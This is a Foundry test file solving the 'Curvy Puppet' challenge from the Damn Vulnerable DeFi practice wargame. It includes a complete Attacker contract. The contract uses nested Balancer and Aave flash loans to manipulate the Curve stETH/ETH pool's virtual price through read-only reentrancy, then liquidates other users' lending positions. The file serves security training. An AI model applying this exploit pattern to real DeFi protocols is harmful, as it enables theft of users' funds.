// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IPermit2} from "permit2/interfaces/IPermit2.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";


contract CurvyPuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address treasury = makeAddr("treasury");

    // Users' accounts
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");

    address constant ETH = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    // Relevant Ethereum mainnet addresses
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IStableSwap constant curvePool = IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    WETH constant weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    uint256 constant TREASURY_WETH_BALANCE = 200e18;
    uint256 constant TREASURY_LP_BALANCE = 65e17;
    uint256 constant LENDER_INITIAL_LP_BALANCE = 1000e18;
    uint256 constant USER_INITIAL_COLLATERAL_BALANCE = 2500e18;
    uint256 constant USER_BORROW_AMOUNT = 1e18;
    uint256 constant ETHER_PRICE = 4000e18;
    uint256 constant DVT_PRICE = 10e18;

    DamnValuableToken dvt;
    CurvyPuppetLending lending;
    CurvyPuppetOracle oracle;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Fork from mainnet state at specific block
        vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 20190356);

        startHoax(deployer);

        // Deploy DVT token (collateral asset in the lending contract)
        dvt = new DamnValuableToken();

        // Deploy price oracle and set prices for ETH and DVT
        oracle = new CurvyPuppetOracle();
        oracle.setPrice({asset: ETH, value: ETHER_PRICE, expiration: block.timestamp + 1 days});
        oracle.setPrice({asset: address(dvt), value: DVT_PRICE, expiration: block.timestamp + 1 days});

        // Deploy the lending contract. It will offer LP tokens, accepting DVT as collateral.
        lending = new CurvyPuppetLending({
            _collateralAsset: address(dvt), _curvePool: curvePool, _permit2: permit2, _oracle: oracle
        });

        // Fund treasury account with WETH and approve player's expenses
        deal(address(weth), treasury, TREASURY_WETH_BALANCE);

        // Fund lending pool and treasury with initial LP tokens
        vm.startPrank(0x4F48031B0EF8acCea3052Af00A3279fbA31b50D8); // impersonating mainnet LP token holder to simplify setup (:
        IERC20(curvePool.lp_token()).transfer(address(lending), LENDER_INITIAL_LP_BALANCE);
        IERC20(curvePool.lp_token()).transfer(treasury, TREASURY_LP_BALANCE);

        // Treasury approves assets to player
        vm.startPrank(treasury);
        weth.approve(player, TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).approve(player, TREASURY_LP_BALANCE);

        // Users open 3 positions in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            // Fund user with some collateral
            vm.startPrank(deployer);
            dvt.transfer(users[i], USER_INITIAL_COLLATERAL_BALANCE);
            // User deposits + borrows from lending contract
            _openPositionFor(users[i]);
        }
    }

    /**
     * Utility function used during setup of challenge to open users' positions in the lending contract
     */
    function _openPositionFor(address who) private {
        vm.startPrank(who);
        // Approve and deposit collateral
        address collateralAsset = lending.collateralAsset();
        // Allow permit2 handle token transfers
        IERC20(collateralAsset).approve(address(permit2), type(uint256).max);
        // Allow lending contract to pull collateral
        permit2.approve({
            token: lending.collateralAsset(),
            spender: address(lending),
            amount: uint160(USER_INITIAL_COLLATERAL_BALANCE),
            expiration: uint48(block.timestamp)
        });
        // Deposit collateral + borrow
        lending.deposit(USER_INITIAL_COLLATERAL_BALANCE);
        lending.borrow(USER_BORROW_AMOUNT);
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Player balances
        assertEq(dvt.balanceOf(player), 0);
        assertEq(stETH.balanceOf(player), 0);
        assertEq(weth.balanceOf(player), 0);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0);

        // Treasury balances
        assertEq(dvt.balanceOf(treasury), 0);
        assertEq(stETH.balanceOf(treasury), 0);
        assertEq(weth.balanceOf(treasury), TREASURY_WETH_BALANCE);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(treasury), TREASURY_LP_BALANCE);

        // Curve pool trades the expected assets
        assertEq(curvePool.coins(0), ETH);
        assertEq(curvePool.coins(1), address(stETH));

        // Correct collateral and borrow assets in lending contract
        assertEq(lending.collateralAsset(), address(dvt));
        assertEq(lending.borrowAsset(), curvePool.lp_token());

        // Users opened position in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            uint256 collateralAmount = lending.getCollateralAmount(users[i]);
            uint256 borrowAmount = lending.getBorrowAmount(users[i]);
            assertEq(collateralAmount, USER_INITIAL_COLLATERAL_BALANCE);
            assertEq(borrowAmount, USER_BORROW_AMOUNT);

            // User is sufficiently collateralized
            assertGt(lending.getCollateralValue(collateralAmount) / lending.getBorrowValue(borrowAmount), 3);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_curvyPuppet() public checkSolvedByPlayer {
        // vm.startPrank(player);
        vm.pauseGasMetering();

        address Balancer = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
        address Aave = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;

        Attacker attacker = new Attacker(curvePool, dvt, lending, Balancer, Aave, weth, stETH);
        IERC20(curvePool.lp_token()).transferFrom(treasury, address(attacker), 5 ether);
        weth.transferFrom(treasury, address(attacker), 150 ether);
        attacker.execute();
        
        vm.resumeGasMetering();
        // vm.stopPrank();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All users' positions are closed
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            assertEq(lending.getCollateralAmount(users[i]), 0, "User position still has collateral assets");
            assertEq(lending.getBorrowAmount(users[i]), 0, "User position still has borrowed assets");
        }

        // Treasury still has funds left
        assertGt(weth.balanceOf(treasury), 0, "Treasury doesn't have any WETH");
        assertGt(IERC20(curvePool.lp_token()).balanceOf(treasury), 0, "Treasury doesn't have any LP tokens left");
        assertEq(dvt.balanceOf(treasury), USER_INITIAL_COLLATERAL_BALANCE * 3, "Treasury doesn't have the users' DVT");

        // Player has nothing
        assertEq(dvt.balanceOf(player), 0, "Player still has DVT");
        assertEq(stETH.balanceOf(player), 0, "Player still has stETH");
        assertEq(weth.balanceOf(player), 0, "Player still has WETH");
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0, "Player still has LP tokens");
    }
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IAaveV3Pool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata interestRateModes, // 0 for no debt (flashloan)
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IFlashLoanReceiver {
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}

interface IStETH {
    function submit(address _referral) external payable returns (uint256);
}

interface IWstETH {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    /// @notice Unwraps wstETH into stETH (burns wstETH, sends stETH to msg.sender)
    function unwrap(uint256 _wstETHAmount) external returns (uint256);
    /// @notice Wraps stETH into wstETH (pulls stETH via transferFrom, sends wstETH)
    function wrap(uint256 _stETHAmount) external returns (uint256);
    /// @notice Helper to calculate how much stETH you need to get a specific amount of wstETH
    function getStETHByWstETH(uint256 _wstETHAmount) external view returns (uint256);
}


contract Attacker is Test, IFlashLoanRecipient, IFlashLoanReceiver {
    IStableSwap curvePool;
    DamnValuableToken dvt;
    CurvyPuppetLending lending;
    IBalancerVault balancer;
    IAaveV3Pool aave;
    WETH weth;
    IERC20 stETH;
    IWstETH wstETH = IWstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);

    uint256 balancer_weth = 37991 * 1e18;
    uint256 aave_weth = 21000 * 1e18;
    uint256 aave_steth = 173000 * 1e18;

    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");
    address treasury = makeAddr("treasury");

    bool private isLiquidating;

    constructor(IStableSwap _curvePool, DamnValuableToken _dvt, CurvyPuppetLending _lending, address _Balancer, address _Aave, WETH _weth, IERC20 _stETH) {
        curvePool = _curvePool;
        dvt = _dvt;
        lending = _lending;
        balancer = IBalancerVault(_Balancer);
        aave = IAaveV3Pool(_Aave);
        weth = _weth;
        stETH = _stETH;
        isLiquidating = false;
    }

    function execute() public {
        weth.withdraw(weth.balanceOf(address(this)));
        startNestedLoan(balancer_weth, aave_weth, aave_steth);

        // Return remaining assets to treasury
        if (address(this).balance > 0) {
            weth.deposit{value: address(this).balance}();
        }
        if (weth.balanceOf(address(this)) > 0) {
            weth.transfer(treasury, weth.balanceOf(address(this)));
        }
        if (IERC20(curvePool.lp_token()).balanceOf(address(this)) > 0) {
            IERC20(curvePool.lp_token()).transfer(treasury, IERC20(curvePool.lp_token()).balanceOf(address(this)));
        }
        if (stETH.balanceOf(address(this)) > 0) {
            stETH.transfer(treasury, stETH.balanceOf(address(this)));
        }
        if (wstETH.balanceOf(address(this)) > 0) {
            wstETH.transfer(treasury, wstETH.balanceOf(address(this)));
        }
    }


    function startNestedLoan(
        uint256 balancerWethAmount,
        uint256 aaveWethAmount,
        uint256 aaveStEthAmount
    ) public {
        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(address(weth));
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = balancerWethAmount;
        // Pass inner loan parameters in userData
        bytes memory userData = abi.encode(aaveWethAmount, aaveStEthAmount);
        balancer.flashLoan(address(this), tokens, amounts, userData);
    }
    /// @notice Step 2: Balancer Callback
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external override {
        require(msg.sender == address(balancer), "Unauthorized Balancer");
        (uint256 aaveWethAmount, uint256 aaveStEthAmount) = abi.decode(userData, (uint256, uint256));
        // Setup Aave multi-asset flash loan
        address[] memory assets = new address[](2);
        assets[0] = address(weth);
        assets[1] = address(wstETH);
        uint256[] memory aaveAmounts = new uint256[](2);
        aaveAmounts[0] = aaveWethAmount;
        aaveAmounts[1] = aaveStEthAmount;
        uint256[] memory modes = new uint256[](2);
        modes[0] = 0;
        modes[1] = 0;
        // Trigger inner flash loan from Aave
        aave.flashLoan(
            address(this),
            assets,
            aaveAmounts,
            modes,
            address(this),
            "",
            0
        );
        // Repay Balancer: Direct transfer back to Vault (0% fee)
        tokens[0].transfer(address(balancer), amounts[0] + feeAmounts[0]);
    }
    /// @notice Step 3: Aave Callback (Here you hold Balancer + Aave funds)
    function executeOperation(
        address[] calldata,
        uint256[] calldata,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata
    ) external override returns (bool) {
        require(msg.sender == address(aave) && initiator == address(this), "Unauthorized");

        uint256 totalEth = balancer_weth + aave_weth;

        weth.withdraw(totalEth);
        wstETH.unwrap(aave_steth);

        {
            stETH.approve(address(curvePool), aave_steth);
            uint256 lp_tokens = curvePool.add_liquidity{value: totalEth}([totalEth, aave_steth], 0);

            isLiquidating = true;
            curvePool.remove_liquidity(lp_tokens, [uint256(0), uint256(0)]);
            isLiquidating = false;
        }

        {
            uint256 wstEthRepay = aave_steth + premiums[1];
            uint256 stEthNeeded = wstETH.getStETHByWstETH(wstEthRepay) + 10;
            uint256 currentStEth = stETH.balanceOf(address(this));
            if (currentStEth < stEthNeeded) {
                IStETH(address(stETH)).submit{value: stEthNeeded - currentStEth + 10}(address(0));
            }
            stETH.approve(address(wstETH), stEthNeeded);
            wstETH.wrap(stEthNeeded);
            wstETH.approve(address(aave), wstEthRepay);
        }

        weth.deposit{value: totalEth + premiums[0]}();
        weth.approve(address(aave), aave_weth + premiums[0]);

        return true;
    }

    receive() external payable {
        if (isLiquidating) {
            uint RatioAfter = curvePool.get_virtual_price();
            console.log("RatioAfter         :", RatioAfter / 1e16);
            
            IERC20(curvePool.lp_token()).approve(address(permit2), type(uint256).max);
            permit2.approve({
                token: curvePool.lp_token(),
                spender: address(lending),
                amount: uint160(5 ether),
                expiration: uint48(block.timestamp + 1 days)
            });

            lending.liquidate(bob);
            lending.liquidate(alice);
            lending.liquidate(charlie);
            dvt.transfer(treasury, dvt.balanceOf(address(this)));
        }
    }
}


